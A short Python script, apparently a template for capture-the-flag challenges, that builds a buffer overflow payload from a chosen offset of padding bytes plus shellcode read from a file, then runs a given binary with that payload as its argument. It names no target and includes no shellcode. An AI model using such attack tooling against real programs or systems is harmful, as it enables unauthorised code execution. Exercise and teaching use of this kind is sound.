# This is a simple file script that can generate a payload for buffer overflows
# This should be customized as necessary depending on the challenges presented

import sys
import subprocess

def generate_payload(offset, shellcode):
    # Craft the payload for a buffer overflow attack
    padding = b'A' * offset
    return padding + shellcode

def execute_payload(payload, binary):
    # Execute the payload with the binary
    try:
        subprocess.run([binary, payload])
    except Exception as e:
        print(f"Error executing payload: {e}")
      
# Displays basic usage syntax
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python BasicBufferOverflow.py <offset> <shellcode_file> <binary>")
        sys.exit(1)

    offset = int(sys.argv[1])
    shellcode_file = sys.argv[2]
    binary = sys.argv[3]

    # Read the shellcode from the specified file
    with open(shellcode_file, 'rb') as file:
        shellcode = file.read()

    # Generate the payload
    payload = generate_payload(offset, shellcode)

    # Execute the payload
    execute_payload(payload, binary)
